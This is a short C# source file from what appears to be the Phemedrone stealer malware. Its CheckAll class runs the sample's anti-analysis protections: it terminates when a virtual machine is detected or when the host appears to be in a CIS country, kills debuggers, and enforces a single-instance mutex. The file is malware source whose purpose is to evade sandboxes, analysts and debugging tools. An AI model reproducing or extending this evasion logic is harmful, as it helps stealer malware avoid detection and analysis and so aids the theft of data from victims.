using System;

namespace Phemedrone.Protections
{
    public class CheckAll
    {
        public static void Check()
        {
            if (Config.AntiVm && Protections.AntiVM.IsVM())
            {
                Environment.FailFast("");
            }

            if (Config.AntiCIS && Protections.CISCheck.IsCIS())
            {
                Environment.FailFast("");
            }
            
            if (Config.AntiDebug)
            {
                AntiDebugger.KillDebuggers();
            }

            if (Config.MutexValue.Length > 0)
            {
                MutexCheck.Check();
            }
        }
    }
}